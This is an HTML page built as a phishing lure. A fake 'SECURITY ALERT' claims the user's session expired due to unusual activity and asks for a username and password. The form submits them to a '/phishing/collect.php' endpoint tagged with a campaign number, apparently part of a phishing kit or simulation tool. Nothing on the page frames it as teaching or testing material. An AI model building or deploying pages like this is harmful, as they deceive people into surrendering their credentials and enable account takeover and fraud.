<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ System Security Alert</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --cosmic-red: #ff0040;
            --cosmic-bg: #1a0000;
            --cosmic-glass: rgba(50, 10, 10, 0.7);
            --cosmic-glow: 0 0 30px rgba(255, 0, 64, 0.6);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: radial-gradient(ellipse at bottom, #1a0000 0%, #030000 100%);
            font-family: 'Share Tech Mono', monospace;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { width:100%; max-width:500px; margin:20px; }
        .glass-panel { background:var(--cosmic-glass); backdrop-filter:blur(12px); border:2px solid var(--cosmic-red); border-radius:24px; padding:40px 30px; box-shadow:0 20px 40px rgba(0,0,0,0.6), var(--cosmic-glow); }
        h1 { color:var(--cosmic-red); text-align:center; margin-bottom:20px; }
        .alert-icon { font-size:3em; text-align:center; margin-bottom:20px; }
        p { color:#ffaaaa; margin-bottom:20px; text-align:center; }
        .form-group { margin-bottom:20px; }
        label { display:block; color:#ff8888; margin-bottom:5px; }
        input { width:100%; padding:12px 16px; background:rgba(0,0,0,0.5); border:1px solid var(--cosmic-red); border-radius:30px; color:#fff; }
        .btn { width:100%; padding:14px; background:transparent; color:var(--cosmic-red); border:2px solid var(--cosmic-red); border-radius:40px; font-size:1.2em; cursor:pointer; margin-top:10px; }
        .btn:hover { background:var(--cosmic-red); color:#000; }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-panel">
            <div class="alert-icon">⚠️</div>
            <h1>SECURITY ALERT</h1>
            <p>Your session has expired due to unusual activity.<br>Please verify your credentials to continue.</p>
            <form action="/phishing/collect.php?campaign=1" method="post">
                <input type="hidden" name="page" value="system_alert">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn">VERIFY</button>
            </form>
        </div>
    </div>
</body>
</html>
